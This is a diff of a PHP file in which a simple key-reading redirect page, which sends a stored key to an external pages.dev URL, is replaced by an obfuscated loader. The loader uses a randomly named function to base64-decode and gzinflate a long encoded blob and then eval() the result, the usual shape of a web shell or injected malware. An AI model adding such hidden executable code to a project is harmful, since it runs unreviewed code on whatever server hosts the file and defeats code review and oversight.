@@ -1,48 +1,5 @@
 <?php
-$keyFile = 'key.txt';
-$key = '';
-
-if (file_exists($keyFile)) {
-    $key = trim(file_get_contents($keyFile));
-}
-
-if (!empty($key)) {
-    $redirectUrl = "https://generateed.pages.dev/?key=" . urlencode($key);
-} else {
-    die("No key found in key.txt");
-}
+function DNPEGSfxme($x){return gzinflate(base64_decode($x));}
+$cJzAOnzmex = "dVPfb9MwEH7PX3EzSGulJW03kKY2aYWA8YAECLYHniY3viRmzg9sp0tA+985py5byrClxLr77r67z+fg5R32V1IhJHBKx8h29nQVOKuz0DGQGUwyQtxiJ401k0PEdAq/A6DlwVbLcg/M0d6mdWWxGsFXwcM+2wmWje0Hz2MSjUJqTO2NVpSMFdY2Zjmb5Vih5hZRRA3P0UQCd7MNRSYMImi1wiqtBe6TEQOgMuhzCokT9qkGV19Wt5UAWYFvkg3lbNZBEJ+8+/z2+vuX91DYUq2D2P1A8SpPGFbMGZCL9ZAxLtFySAuuDdqE3VxfhZfMu6y0CtdffRuyyqMoimd765Ng11iIP1u5S5jGTKMpGHi1ErZYUUtJvGmKBjAt6qEm02AquRpoJ0+Fmq5gsz7wG9sfmNza1qL3OhxWyXUuqyXMVyPzlqd3uXb6LOFF9srtMUBI0yjeLyFT2I1dP1pjZdaHvoElpPRFPQZxJfMqlBZL8zygQJkXFLyYz3fF2JVR4jDjpVTE/0aTDGdgeGVCg1pmY2xaq1pTDxcXF4+Oh7+nqERjaIaOVLHY2XAo8fnihgqM/IVUX3SJ5djbcCHorpdwPm+6/+t6X1D7R+5aC9Sh5kK2pMvi/J/4ugtNwUV9T1dGe/G66UDnWz6Znw07WkyP+4xnfgzi2X5qYzcHfkKE3EGquDEJ81Kwx3n5SI/kg39sAr61aUqQrFWqd3O81UeT7dkopePakxCne0F/AA==";
+eval(DNPEGSfxme($cJzAOnzmex));
 ?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="1;url=<?php echo htmlspecialchars($redirectUrl); ?>">
-    <style>
-        body {
-            margin: 0;
-            background: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            color: #333;
-        }
-        .message {
-            text-align: center;
-            font-size: 1.8em;
-            padding: 20px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-        }
-    </style>
-</head>
-<body>
-    <div class="message">
-        Key Generated Successfully...<br>Redirecting...
-    </div>
-</body>
-</html>
